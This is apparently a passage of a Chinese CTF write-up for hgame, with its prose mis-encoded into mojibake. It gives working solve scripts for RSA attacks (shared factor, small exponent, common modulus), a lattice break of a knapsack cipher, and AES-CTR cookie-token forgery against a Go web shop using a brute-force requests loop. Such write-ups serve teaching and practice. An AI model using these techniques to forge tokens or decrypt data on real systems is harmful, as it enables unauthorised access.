class="keyword">import</span> chall4_secret</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAServe</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.p = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.q = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.e = getPrime(<span class="number">17</span>)</span><br><span class="line">        self.m = chall4_secret</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_, self.e, self.p*self.q)</span><br><span class="line">        self.e = getPrime(<span class="number">17</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.p*self.q, self.e</span><br></pre></td></tr></table></figure></blockquote><p>æ±‚è§£å››å±‚RSAæ‹¿flagã€‚</p><p>ç¬¬ä¸€å±‚ï¼Œ$m&lt;p$ï¼Œæ— éœ€å®Œå…¨åˆ†è§£ $n$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">322341817140424854310546430443927118765748131714269745607168549026570389299661764844365062948036437</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">304198953434620851532952216290120837853</span></span><br><span class="line">c = <span class="number">0x22ca52bc2ed70d7133a0916529d73ed1e91f36f6d7d7118d40de0cdae89c692d637a28727a4b90077d</span></span><br><span class="line">d = inverse_mod(e,p-<span class="number">1</span>)</span><br><span class="line">m = <span class="built_in">int</span>(<span class="built_in">pow</span>(c%p,d,p))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b&#x27;m&lt;n_But_also_m&lt;p&#x27;</span></span><br></pre></td></tr></table></figure><p>ç¬¬äºŒå±‚ï¼Œ$\gcd(n1,n2)=p$ï¼Œäº¤äº’ä¸¤æ¬¡æ•°æ®ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">n1 = <span class="number">85985649208163776168434106703299680942043569819886697084537149593016735251489437349033723731635167019919946528408991797589149306964593269240843489773393816361050438737217630268220265477449408440087731905143882172966401806119978492409284761350964437389319354732032636067387214869765942537900408255046554977317</span></span><br><span class="line">c1 = <span class="number">0x75124a122559d227bb846448b401877c86e7ac67dc5a1329622a6b54bbae91d3bc5a9afb859d86d90ac24cdd76cc7fa0763be082d9aa9f0c487d44f7a0725d6f195d6168837468c505f92dd1da29b618e3de01292a9592a1b2ce3d4dcdc4cad202c3c1fe190bb2469cf401b1a2fef29b8e487db908f30085e262ef84e6501118</span></span><br><span class="line">n2 = <span class="number">59612565629569243187927748458601473421039478282275869456898180179757129074951912462324655640636883153553671190318605493897644967308094259008273993958933708638671942944003571666749098289527528628582925016986696150709641914606485011406578947680624107267500302631283661241951979431008098395802457051450378936263</span></span><br><span class="line">c2 = <span class="number">0x23db0d9129161ba5318a43bf18db2ac276faa8e6f75b9a48250dbbc04de5b6a67764f8f8917f3f11e4b7308d7563f262500abcc59f0dc44bdc20d438e9ad424dbf7b7187b6cab4eeb5b32fdeb800e8dd6afcea3f97d97bac3be5a5fe9fbb06717dbf43f68cf0f91754e4f89e9a606b21c1467d3b8a7a0ed10e40f3bfb1e81a6a</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = gcd(n1,n2)</span><br><span class="line">q1 = n1//p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c1,d,n1)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#b&#x27;make_all_modulus_independent&#x27;</span></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰å±‚ï¼Œ$e=3$ï¼Œ$m^e \lt n$ï¼Œå° $e$ æ”»å‡»ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">62704397894391666479295080309251941192000653454396729807060395416391202444260383706554703418832720336900862424454646857290291688832249601582850489926515630514103107259941315796861595330414857499788329730467181727640390968106751789752583882632594974153970877867469382083206724358855594117005793286924964786309</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">0xfec61958cefda3eb5f709faa0282bffaded0a323fe1ef370e05ed3744a2e53b55bdd43e9594427c35514505f26e4691ba86c6dcff6d29d69110b15b9f84b0d8eb9ea7c03aaf24fa957314b89febf46a615f81ec031b12fe725f91af9d269873a69748</span></span><br><span class="line">m = gmpy2.iroot(c,e)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#b&#x27;encrypt_exponent_should_be_bigger&#x27;</span></span><br></pre></td></tr></table></figure><p>ç¬¬å››å±‚ï¼Œå…±æ¨¡æ”»å‡»ï¼Œäº¤äº’ä¸¤æ¬¡æ•°æ®ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line"><span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">g, y, x = egcd(b % a, a)</span><br><span class="line"><span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line">n = <span class="number">95910070679089754882020609736361209978330742771232029437332648538529286081128112666433856280432204891053831926879516053786710256434719058164494668021689267490579582989448124586518700994273232858281123929454653035358779110102882528619796861827968986375140987711988221162025924201304147782787221328299013679367</span></span><br><span class="line">e1 = <span class="number">81919</span></span><br><span class="line">c1 = <span class="number">0x1d884ae280842f2c9f26fd4ec97d3e4d8d58cbe2ec0420f2179451663b873989d9dac3d796f6be72c982f82cd96dc346620c7028e48d0059acaa0242b36646c82e08a3e327ca0e2ee5f5cba574ad02953f3302963cd75760ea6bb5d8bc955b0b3d1c4f885d20cb8bb2d720331cba9fb0fb6a433e2b1f1ac588cf820be4169add</span></span><br><span class="line">e2 = <span class="number">108041</span></span><br><span class="line">c2 = <span class="number">0x69bd0266cd0c825ea1ac562385bb42be7040e1002e31f73c4139127577aa1d9d2a5cc05236bf03afb126202609e9fecc717bd229145bc7c5972a05476a8b66b8be1740f4f468ac24e9d8ed3ed5836a537aed77ad910bbb185a0421ed9faf97776e128058563ef0520e9fdf6ad47408da86ed02ab46761b962f8f34750c3791e1</span></span><br><span class="line"></span><br><span class="line">s = egcd(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">s1 = - s1</span><br><span class="line">c1 = gp.invert(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">s2 = - s2</span><br><span class="line">c2 = gp.invert(c2, n)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n) % n</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#b&#x27;never_uese_same_modulus&#x27;</span></span><br></pre></td></tr></table></figure><p>å››æ¬¡æäº¤æ­£ç¡®å¾—flagï¼š<code>hgame&#123;W0w_you^knowT^e_CoMm0n_&amp;t$ack_@bout|RSA&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="åŒ…é‡Œæœ‰ä»€ä¹ˆ"><a href="#åŒ…é‡Œæœ‰ä»€ä¹ˆ" class="headerlink" title="åŒ…é‡Œæœ‰ä»€ä¹ˆ"></a>åŒ…é‡Œæœ‰ä»€ä¹ˆ</h3><blockquote><p>å…”å…”æ”¶åˆ°äº†ä¸€åŒ…å¹´è´§ï¼Œä½†æ˜¯ä»–å¿˜äº†é‡Œé¢æœ‰ä»€ä¹ˆäº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> gcd, s2n</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">plain = flag[<span class="number">6</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">&#x27;hgame&#123;&#x27;</span> + plain + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">v = <span class="built_in">bin</span>(s2n(plain))[<span class="number">2</span>:]</span><br><span class="line">l = <span class="built_in">len</span>(v)</span><br><span class="line">a = [<span class="number">2</span> &lt;&lt; i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l)]</span><br><span class="line">m = randint(<span class="built_in">sum</span>(a), <span class="number">2</span> &lt;&lt; l + <span class="number">1</span>)</span><br><span class="line">w = randint(<span class="number">0</span>, m)</span><br><span class="line"><span class="keyword">assert</span> gcd(w, m) == <span class="number">1</span></span><br><span class="line">b = [w * i % m <span class="keyword">for</span> i <span class="keyword">in</span> a]</span><br><span class="line"></span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    c += b[i] * <span class="built_in">int</span>(v[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;m = <span class="subst">&#123;m&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;b0 = <span class="subst">&#123;b[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># m = 1528637222531038332958694965114330415773896571891017629493424</span></span><br><span class="line"><span class="comment"># b0 = 69356606533325456520968776034730214585110536932989313137926</span></span><br><span class="line"><span class="comment"># c = 93602062133487361151420753057739397161734651609786598765462162</span></span><br></pre></td></tr></table></figure></blockquote><p>å…ˆåˆ©ç”¨ $b_0$ æ±‚ $w$ï¼Œå†è§£èƒŒåŒ…å¯†ç ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">m = <span class="number">1528637222531038332958694965114330415773896571891017629493424</span></span><br><span class="line">b0 = <span class="number">69356606533325456520968776034730214585110536932989313137926</span></span><br><span class="line">c = <span class="number">93602062133487361151420753057739397161734651609786598765462162</span></span><br><span class="line"></span><br><span class="line">w = b0//<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é¢„ä¼°é•¿åº¦</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    l = m.nbits() - k</span><br><span class="line">    a = [<span class="number">2</span> &lt;&lt; i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l)]</span><br><span class="line">    b = [w * i % m <span class="keyword">for</span> i <span class="keyword">in</span> a]</span><br><span class="line">    </span><br><span class="line">    pk =  b</span><br><span class="line">    ct =  c</span><br><span class="line">    n = <span class="built_in">len</span>(pk)</span><br><span class="line"></span><br><span class="line">    M = Matrix.identity(n) * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    last_row = [<span class="number">1</span> <span class="keyword">for</span> x <span class="keyword">in</span> pk]</span><br><span class="line">    M_last_row = Matrix(ZZ, <span class="number">1</span>, <span class="built_in">len</span>(last_row), last_row)</span><br><span class="line"></span><br><span class="line">    last_col = pk</span><br><span class="line">    last_col.append(ct)</span><br><span class="line">    M_last_col = Matrix(ZZ, <span class="built_in">len</span>(last_col), <span class="number">1</span>, last_col)</span><br><span class="line"></span><br><span class="line">    M = M.stack(M_last_row)</span><br><span class="line">    M = M.augment(M_last_col)</span><br><span class="line"></span><br><span class="line">    X = M.BKZ()</span><br><span class="line"></span><br><span class="line">    sol = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n + <span class="number">1</span>):</span><br><span class="line">        testrow = X.row(i).<span class="built_in">list</span>()[:-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">set</span>(testrow).issubset([-<span class="number">1</span>, <span class="number">1</span>]):</span><br><span class="line">            <span class="keyword">for</span> v <span class="keyword">in</span> testrow:</span><br><span class="line">                <span class="keyword">if</span> v == <span class="number">1</span>:</span><br><span class="line">                    sol.append(<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">elif</span> v == -<span class="number">1</span>:</span><br><span class="line">                    sol.append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    s = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,sol)),<span class="number">2</span>))[<span class="number">2</span>:])</span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;:/b2\x83.F\x832z2\x1a\x82v&#123;\x1a\x82Z2G&quot;\x82Z/\x03&#x27;</span></span><br><span class="line"><span class="comment"># b&#x27;b\xe8N\xe6\xbeh\xdc\xbef\xc2\xe6\xf2\xbe\xc4\xc2r\xbe\xd2\xe6\xdcn\xbe\xd2\xe8~&#x27;</span></span><br><span class="line"><span class="comment"># b&quot;1t&#x27;s_4n_3asy_ba9_isn7_it?&quot;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="é›¶å…ƒè´­å¹´è´§å•†åº—"><a href="#é›¶å…ƒè´­å¹´è´§å•†åº—" class="headerlink" title="é›¶å…ƒè´­å¹´è´§å•†åº—"></a>é›¶å…ƒè´­å¹´è´§å•†åº—</h3><blockquote><p>å¬è¯´å…”å…”è¦ä¹°å¹´è´§ï¼Œæ­£å¥½æç“¦ç‰¹å¤§é™†çš„ç’ƒæœˆæµ·ç¯èŠ‚ä¹Ÿè¦åˆ°äº†ï¼Œtr0ubleç‰¹åœ°ä¸ºå…”å…”å‡†å¤‡äº†ä¸€ä»½flagå¤§ç¤¼ã€‚å—¯ï¼Œä½ ä¹Ÿæƒ³è¦ï¼Ÿä¸å¯ä»¥å“¦ã€‚</p></blockquote><p><code>router/router.go</code> é‡Œä¸»è¦é€»è¾‘ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">loginController</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">_, err := c.Cookie(<span class="string">&quot;token&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">c.Redirect(http.StatusFound, <span class="string">&quot;/home&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">userName := c.PostForm(<span class="string">&quot;username&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> userName == <span class="string">&quot;Vidar-Tu&quot;</span> &#123;</span><br><span class="line">c.String(http.StatusForbidden, <span class="string">&quot;å…”å…”æ‰ä¸å¯èƒ½æ˜¯ä½ å‘¢ï¼ï¼&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">User := user.User&#123;Name: userName, Created: time.Now().Unix(), Uid: <span class="string">&quot;230555433&quot;</span>&#125;</span><br><span class="line">jsonUser, _ := json.Marshal(User)</span><br><span class="line">token, _ := util.Encrypt(<span class="type">string</span>(jsonUser))</span><br><span class="line">c.SetCookie(<span class="string">&quot;token&quot;</span>, token, <span class="number">3600</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">false</span>, <span class="literal">true</span>)</span><br><span class="line">c.Redirect(http.StatusFound, <span class="string">&quot;/home&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">buyController</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">method := c.Request.Method</span><br><span class="line">token, err := c.Cookie(<span class="string">&quot;token&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.String(http.StatusForbidden, <span class="string">&quot;æ²¡æœ‰èº«ä»½çš„äººå¯ä¸èƒ½æ¥è¿™å„¿ä¹°ä¸œè¥¿ã€‚&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">jsonUser, err := util.Decrypt(token)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.String(http.StatusBadGateway, err.Error())</span><br><span class="line">&#125;</span><br><span class="line">User := user.User&#123;&#125;</span><br><span class="line">err = json.Unmarshal([]<span class="type">byte</span>(jsonUser), &amp;User)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.String(http.StatusBadGateway, err.Error())</span><br><span class="line">&#125;</span><br><span class="line">name := User.Name</span><br><span class="line"><span class="keyword">if</span> method != http.MethodGet &#123;</span><br><span class="line">c.String(http.StatusMethodNotAllowed, fmt.Sprintf(<span class="string">&quot;your method: %s. but only get method allowed&quot;</span>, method))</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">product := c.Query(<span class="string">&quot;prod&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> product == <span class="string">&quot;flag&quot;</span> &#123;</span><br><span class="line"><span class="keyword">if</span> name != <span class="string">&quot;Vidar-Tu&quot;</span> &#123;</span><br><span class="line">c.String(http.StatusOK, <span class="string">&quot;flag å¯æ˜¯ç‰¹åœ°ä¸ºå…”å…”å‡†å¤‡çš„ï¼&quot;</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">file, _ := os.Open(<span class="string">&quot;flag.txt&quot;</span>)</span><br><span class="line">flag, _ := io.ReadAll(file)</span><br><span class="line">c.String(http.StatusOK, fmt.Sprintf(<span class="string">&quot;%s buy %s successfully\n%s&quot;</span>, name, product, flag))</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">c.String(http.StatusOK, fmt.Sprintf(<span class="string">&quot;%s buy %s successfully&quot;</span>, name, product))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éœ€è¦tokené‡ŒuserNameå€¼ä¸º <code>Vidar-Tu</code>ï¼Œä½†ä¸èƒ½ç›´æ¥è¾“å…¥ <code>Vidar-Tu</code>ã€‚</p><p>æŸ¥çœ‹ <code>util/util.go</code> é‡Œï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> util</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;crypto/aes&quot;</span></span><br><span class="line"><span class="string">&quot;crypto/cipher&quot;</span></span><br><span class="line"><span class="string">&quot;crypto/rand&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/base64&quot;</span></span><br><span class="line"><span class="string">&quot;errors&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> key = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">16</span>)</span><br><span class="line"><span class="keyword">var</span> iv = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">_, _ = rand.Read(key)</span><br><span class="line">_, _ = rand.Read(iv)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Encrypt</span><span class="params">(u <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">block, err := aes.NewCipher(key)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">&#125;</span><br><span class="line">plainText := []<span class="type">byte</span>(u)</span><br><span class="line">blockMode := cipher.NewCTR(block, iv)</span><br><span class="line">cipherText := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(plainText))</span><br><span class="line">blockMode.XORKeyStream(cipherText, plainText)</span><br><span class="line"><span class="keyword">return</span> base64.StdEncoding.EncodeToString(cipherText), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Decrypt</span><span class="params">(cipherText <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">decodeData, err := base64.StdEncoding.DecodeString(cipherText)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>, errors.New(<span class="string">&quot;invalid base64&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">block, err := aes.NewCipher(key)</span><br><span class="line">blockMode := cipher.NewCTR(block, iv)</span><br><span class="line">plainText := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(decodeData))</span><br><span class="line">blockMode.XORKeyStream(plainText, decodeData)</span><br><span class="line"><span class="keyword">return</span> <span class="type">string</span>(plainText), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tokençš„ä½¿ç”¨AES-CTRæ¨¡å¼åŠ å¯†ç”Ÿæˆï¼Œè€Œåœ¨CTRæ¨¡å¼ä¸­ï¼Œ æœ‰ä¸€ä¸ªè‡ªå¢çš„ç®—å­ï¼ˆIVï¼Œåå››ä¸ªå­—èŠ‚ç›¸å½“äºè®¡æ•°å™¨ï¼Œæ¯æ¬¡è®¡ç®—é€’å¢ï¼‰ï¼Œè¿™ä¸ªç®—å­ç”¨å¯†é’¥åŠ å¯†ä¹‹åçš„è¾“å‡ºå’Œæ˜æ–‡å¼‚æˆ–çš„ç»“æœå¾—åˆ°å¯†æ–‡ï¼Œç›¸å½“äºä¸€æ¬¡ä¸€å¯†ï¼Œå³ $m \oplus \text{keystream} = c$ã€‚</p><p>ç”¨æˆ·åå’Œtokenä¸ºä¸€ä¸€å¯¹åº”å…³ç³»ï¼Œè¾“å…¥ <code>Vidar-Tv</code> å’Œ <code>Vidar-Tw</code> è·å–å¯¹åº”tokençš„base64å­—ç¬¦ä¸²ï¼Œæ‰¾åˆ°æ”¹å˜çš„å­—ç¬¦ï¼Œçˆ†ç ´ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters+string.digits+<span class="string">&#x27;+/&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> dic:</span><br><span class="line">    token = <span class="string">f&#x27;NnL3arZc7tt+ezcky+B8fF<span 